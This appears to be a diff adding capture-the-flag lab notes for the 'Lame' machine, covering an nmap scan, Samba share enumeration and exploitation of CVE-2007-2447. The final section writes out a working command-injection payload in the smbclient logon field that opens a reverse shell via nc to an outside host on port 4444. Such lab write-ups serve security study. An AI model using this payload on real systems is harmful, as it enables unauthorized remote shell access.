@@ -1,0 +1,35 @@
+* solution:
+  1. nmap
+  #+begin_src sh
+nmap -sC -sV -oA Lame.nmap <ip>
+    ## find smb service with version
+  #+end_src
+  #+NAME: nmap result
+  [[./nmap.png]]
+  2. (since ftp backdoor does not work), search <smb 3.0.20>
+      + CVE-2007-2447 (msfconsole will give this result)
+
+* problems:
+  1. had to use smb version NT1 to connect server. 
+  
+* CVE-2007-2447 manual script:
+   + config smbclient to use NT1
+   + enumerate the smb directory, find where anonymous login is possible:
+   #+begin_src sh
+smbclient -L //ip
+   #+end_src
+   
+   + anonymous login to /tmp
+   #+begin_src sh
+smbclient //ip/tmp
+   #+end_src
+
+   + use the logon script:
+   #+begin_src sh
+logon "/=`nohup rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.26 4444 >/tmp/g;rm /tmp/g`" ""
+     ## logon “/= `<payload>`”
+     ## based on CVE-2007-2447, the logon script did not censor user input properly, as a result, the script enclosed within the backtips is executed.
+     ## vuln at source/smbd/map_username.c
+     ## internal of the vuln: https://0x00sec.org/t/cvexplained-cve-2007-2447/22748
+   #+end_src
+
